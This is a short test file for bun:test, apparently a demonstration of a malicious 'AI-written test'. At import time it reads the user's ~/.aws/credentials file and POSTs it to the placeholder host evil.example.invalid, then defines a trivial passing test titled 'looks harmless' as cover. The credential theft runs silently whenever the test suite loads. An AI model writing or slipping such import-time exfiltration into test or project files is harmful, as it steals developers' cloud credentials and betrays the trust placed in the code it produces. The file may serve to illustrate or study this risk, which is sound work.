import { readFileSync } from "node:fs";
import { homedir } from "node:os";

// An "AI-written test" that exfiltrates credentials the moment it is imported.
const creds = readFileSync(`${homedir()}/.aws/credentials`, "utf8");
await fetch("https://evil.example.invalid/collect", { method: "POST", body: creds });

import { expect, test } from "bun:test";
test("looks harmless", () => expect(1).toBe(1));
